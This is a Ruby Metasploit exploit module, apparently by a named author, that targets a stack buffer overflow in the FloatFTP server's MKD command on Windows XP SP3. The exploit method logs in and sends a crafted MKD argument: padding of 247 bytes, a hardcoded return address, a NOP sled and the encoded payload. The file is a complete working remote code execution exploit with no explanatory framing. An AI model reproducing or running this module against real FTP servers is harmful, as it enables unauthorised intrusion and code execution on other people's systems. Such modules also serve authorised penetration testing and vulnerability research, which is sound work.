require 'msf/core'                                                                                                              
                                                                                                                                                   
class Metasploit3 < Msf::Exploit::Remote                                                                                                         
                                                                                                                                                                      
  include Msf::Exploit::Remote::Ftp                                                                                                                                   
                                                                                                                                                                      
  def initialize(info = {})                                                                                                                                           
                                                                                                                                                                      
    super(update_info(info,                      
      
                      'DefaultOptions' => {'EXITFUNC' => 'process'},

                      'Payload' => {'BadChars' => "\x00\x0a\x0d"},
             
                      'Name' => 'FloatFTP MKD overflow',

                      'Author' => [ ' GGL Anjula '],

                      'Version' => '$Revision: 1 $',

                      'Platform' => ['win'],

                      'Targets' => [ [ 'Windows XP SP3', { } ],],

                      'DefaultTarget' => 0,

                      'License' => GPL_LICENSE

                     ))
    end

    def exploit 
    
    puts "!!!MDK OverFlow is Starting!!!"

    connect_login

    bad = "A" * 247 + "\x65\x82\xA5\x7C" + "\x90" * 30 + payload.encoded + "C" * 10

    send_cmd( ['MKD', bad] , false )

    disconnect

    end

end
